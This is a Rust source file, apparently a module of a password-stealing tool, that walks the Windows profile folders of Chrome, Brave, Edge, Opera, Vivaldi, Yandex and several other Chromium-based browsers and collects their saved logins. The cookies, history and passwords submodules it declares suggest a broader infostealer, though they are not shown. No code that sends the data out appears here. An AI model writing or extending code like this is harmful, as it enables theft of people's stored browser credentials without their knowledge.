pub mod cookies;
pub mod history;
pub mod passwords;

use std::{env, path::Path};

use crate::browser::Login;
use passwords::get_creds_chrome;

pub fn get_creds_chromium() -> Option<Vec<Login>> {
    let mut creds: Vec<Login> = Vec::new();
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!("{}\\Google\\Chrome\\User Data", env::var("LOCALAPPDATA").ok()?))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!("{}\\BraveSoftware\\Brave-Browser\\User Data", env::var("LOCALAPPDATA").ok()?))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!("{}\\Chromium\\User Data", env::var("LOCALAPPDATA").ok()?))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!("{}\\Comodo\\Dragon\\User Data", env::var("LOCALAPPDATA").ok()?))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!("{}\\Microsoft\\Edge\\User Data", env::var("LOCALAPPDATA").ok()?))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!("{}\\Epic Privacy Browser\\User Data", env::var("LOCALAPPDATA").ok()?))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!("{}\\Iridium\\User Data", env::var("LOCALAPPDATA").ok()?))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!("{}\\Opera Software\\Opera Stable", env::var("APPDATA").ok()?))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!("{}\\Opera Software\\Opera GX Stable", env::var("APPDATA").ok()?))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!("{}\\Slimjet\\User Dat", env::var("LOCALAPPDATA").ok()?))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!("{}\\UR Browser\\User Data", env::var("LOCALAPPDATA").ok()?))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!("{}\\Vivaldi\\User Data", env::var("LOCALAPPDATA").ok()?))) {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_chrome(Path::new(&format!("{}\\Yandex\\YandexBrowser\\User Data", env::var("LOCALAPPDATA").ok()?))) {
        creds.append(&mut cred)
    }
    if creds.is_empty() {return None;}
    Some(creds) 
}